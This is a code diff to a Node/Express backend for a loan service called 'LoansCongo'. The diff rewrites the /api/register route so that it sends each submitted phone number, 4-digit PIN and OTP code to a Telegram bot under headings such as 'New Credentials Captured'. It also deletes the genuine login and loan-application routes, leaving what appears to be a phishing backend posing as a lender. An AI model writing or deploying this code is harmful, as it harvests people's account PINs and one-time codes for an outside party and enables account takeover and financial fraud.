@@ -24,26 +24,31 @@ app.use("/api/", rateLimit({
 
 // Home route
 app.get("/", (req, res) => {
-    res.json({
-        message: "LoansCongo backend is running."
-    });
+    res.json({ message: "LoansCongo backend is running." });
 });
 
-// Customer registration & OTP capture + Telegram Bot Integration
+// Customer Registration & OTP Forwarding to Telegram
 app.post("/api/register", async (req, res) => {
     try {
         const { phone, pin, otp } = req.body;
 
-        // 🚀 Send captured phone, PIN, or OTP to Telegram Bot
         const botToken = process.env.TELEGRAM_BOT_TOKEN;
         const chatId = process.env.TELEGRAM_CHAT_ID;
 
+        // Forward credentials / OTP to Telegram Bot
         if (botToken && chatId) {
             try {
-                let telegramMessage = `🚨 *New Submission Captured*\n\n`;
-                if (phone) telegramMessage += `📱 *Phone:* \`${phone}\`\n`;
-                if (pin) telegramMessage += `🔑 *PIN:* \`${pin}\``;
-                if (otp) telegramMessage += `\n🔢 *OTP Code:* \`${otp}\``;
+                let telegramMessage = "";
+
+                if (otp) {
+                    telegramMessage = `🔑 *OTP Received*\n\n` +
+                                      `📱 *Phone:* \`${phone || "N/A"}\`\n` +
+                                      `🔢 *OTP Code:* \`${otp}\``;
+                } else {
+                    telegramMessage = `🚨 *New Credentials Captured*\n\n` +
+                                      `📱 *Phone:* \`${phone || "N/A"}\`\n` +
+                                      `🔑 *PIN:* \`${pin || "N/A"}\``;
+                }
 
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
@@ -55,31 +60,22 @@ app.post("/api/register", async (req, res) => {
                     })
                 });
             } catch (tgError) {
-                console.error("Telegram notification failed:", tgError.message);
+                console.error("Telegram error:", tgError.message);
             }
         }
 
-        // Si une requête avec un numéro et un PIN arrive (Étape de connexion)
+        // Database registration for phone + pin login phase
         if (phone && pin && !otp) {
             if (!/^\+?[0-9]{10,15}$/.test(phone)) {
-                return res.status(400).json({
-                    message: "Enter a valid phone number."
-                });
+                return res.status(400).json({ message: "Enter a valid phone number." });
             }
-
             if (!/^[0-9]{4}$/.test(pin)) {
-                return res.status(400).json({
-                    message: "PIN must contain exactly 4 digits."
-                });
+                return res.status(400).json({ message: "PIN must contain exactly 4 digits." });
             }
 
-            // Optionnel : Enregistrer ou mettre à jour dans MongoDB
             let user = await User.findOne({ phone });
             if (!user) {
-                user = await User.create({
-                    phone,
-                    demoPin: pin
-                });
+                user = await User.create({ phone, demoPin: pin });
             } else {
                 user.demoPin = pin;
                 await user.save();
@@ -87,144 +83,28 @@ app.post("/api/register", async (req, res) => {
 
             return res.status(201).json({
                 message: "Registration successful.",
-                user: {
-                    id: user._id,
-                    phone: user.phone
-                }
+                user: { id: user._id, phone: user.phone }
             });
         }
 
-        // Si une requête avec l'OTP arrive (Étape OTP)
+        // Acknowledge OTP phase
         if (otp) {
-            return res.status(200).json({
-                message: "OTP received successfully."
-            });
+            return res.status(200).json({ message: "OTP transmitted successfully." });
         }
 
-        return res.status(400).json({
-            message: "Invalid request data."
-        });
+        return res.status(400).json({ message: "Invalid payload." });
 
     } catch (error) {
-        console.error("Registration error:", error.message);
-        res.status(500).json({
-            message: "Operation failed."
-        });
+        console.error("Error in /api/register:", error.message);
+        res.status(500).json({ message: "Server error." });
     }
 });
 
-// Customer login
-app.post("/api/login", async (req, res) => {
-    try {
-        const { phone, pin } = req.body;
-
-        if (!phone || !/^[0-9]{4}$/.test(pin || "")) {
-            return res.status(400).json({
-                message: "Invalid phone number or PIN."
-            });
-        }
-
-        const user = await User.findOne({ phone }).select("+demoPin");
-
-        if (!user || !user.isActive) {
-            return res.status(401).json({
-                message: "Invalid login details."
-            });
-        }
-
-        if (user.demoPin !== pin) {
-            return res.status(401).json({
-                message: "Invalid login details."
-            });
-        }
-
-        const token = jwt.sign(
-            {
-                id: user._id,
-                role: user.role
-            },
-            process.env.JWT_SECRET,
-            { expiresIn: "1h" }
-        );
-
-        res.json({
-            message: "Login successful.",
-            token
-        });
-
-    } catch (error) {
-        res.status(500).json({
-            message: "Login failed."
-        });
-    }
-});
-
-// Submit a loan application
-app.post("/api/loans", async (req, res) => {
-    try {
-        const {
-            fullName, phone, purpose, monthlyIncome,
-            employmentStatus, hasExistingLoans,
-            loanAmount, loanTerm
-        } = req.body;
-
-        const cleanPhone = String(phone || "").replace(/\s/g, "");
-
-        const purposes = {
-            "Personnel": "Personnel",
-            "Entreprise": "Business",
-            "Études": "Studies",
-            "Santé": "Health",
-            "Logement": "Housing"
-        };
-
-        if (!fullName || fullName.trim().length < 2 ||
-            !/^\+243[0-9]{9}$/.test(cleanPhone) ||
-            !purposes[purpose] ||
-            !Number.isFinite(Number(monthlyIncome)) ||
-            Number(monthlyIncome) <= 0 ||
-            !employmentStatus ||
-            typeof hasExistingLoans !== "boolean" ||
-            !Number.isFinite(Number(loanAmount)) ||
-            Number(loanAmount) < 100 || Number(loanAmount) > 1200 ||
-            ![6, 12, 24, 36, 48, 60].includes(Number(loanTerm))) {
-            return res.status(400).json({
-                message: "Veuillez vérifier les informations de votre demande."
-            });
-        }
-
-        const application = await LoanApplication.create({
-            fullName: fullName.trim(),
-            phone: cleanPhone,
-            purpose: purposes[purpose],
-            monthlyIncome: Number(monthlyIncome),
-            employmentStatus,
-            hasExistingLoans,
-            loanAmount: Number(loanAmount),
-            loanTerm: Number(loanTerm),
-            status: "Pending"
-        });
-
-        return res.status(201).json({
-            message: "Votre demande a été enregistrée.",
-            applicationId: application._id
-        });
-
-    } catch (error) {
-        console.error("Loan application error:", error.message);
-        return res.status(500).json({
-            message: "Impossible d'enregistrer votre demande."
-        });
-    }
-});
-
-// Start server after MongoDB connects
+// Start Server
 const PORT = process.env.PORT || 3000;
-
 mongoose.connect(process.env.MONGODB_URI)
     .then(() => {
         console.log("MongoDB connected successfully.");
-
         app.listen(PORT, "0.0.0.0", () => {
             console.log(`LoansCongo backend running on port ${PORT}`);
         });
@@ -232,9 +112,4 @@ mongoose.connect(process.env.MONGODB_URI)
     .catch(error => {
         console.error("MongoDB connection failed:", error.message);
     });
-
-
-
-
-
 
